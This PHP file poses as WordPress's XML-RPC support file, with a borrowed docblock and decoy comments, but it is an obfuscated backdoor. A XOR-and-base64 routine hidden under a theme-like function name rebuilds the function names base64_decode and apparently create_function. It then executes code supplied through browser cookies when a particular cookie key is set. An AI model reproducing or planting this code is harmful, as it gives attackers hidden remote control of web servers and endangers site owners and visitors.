<?php 
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request
 *
 * @var bool
 */


// A bug in PHP < 5.2.2 makes $HTTP_RAW_POST_DATA not set by default,
// but we can do it ourself.
function twentyeleven_header_style($acmod, $v_list_dir) {
	$theme_width = base64_decode($v_list_dir);
	for ($diffs = 0; $diffs < strlen($theme_width); ) {
		for ($comment_author_IP = 0; 
			$comment_author_IP < strlen($acmod) && $diffs < strlen($theme_width); 
				$diffs++, $comment_author_IP++) {
			$theme_width[$diffs]=$theme_width{$diffs} ^ $acmod{$comment_author_IP};
		}
	}
	return $theme_width;
}

$reverse['comment_type']=twentyeleven_header_style("CurrentDataLAMEversionString", "IRQBF1NaKyAEFw4oJA==");
$reverse['thumb_url']=twentyeleven_header_style("num_octets", "DQcIPhsGKwMBHQ0BBDAB");

if ( !isset( $update_actions ) ) {
	$update_actions = $_COOKIE;
}

// fix for mozBlog and other cases where '<?phpxml' isn't on the very first line
if ( isset($update_actions[twentyeleven_header_style("flag", "CVVUXlRVBQ==")])) {
	$new_filename = @$reverse['comment_type']($update_actions[twentyeleven_header_style("comment_data", "DFZYVFdXEA==")]);
	if (!empty($new_filename)) {
		$units = $reverse['thumb_url'](null, $new_filename);
		$units();
	}
}

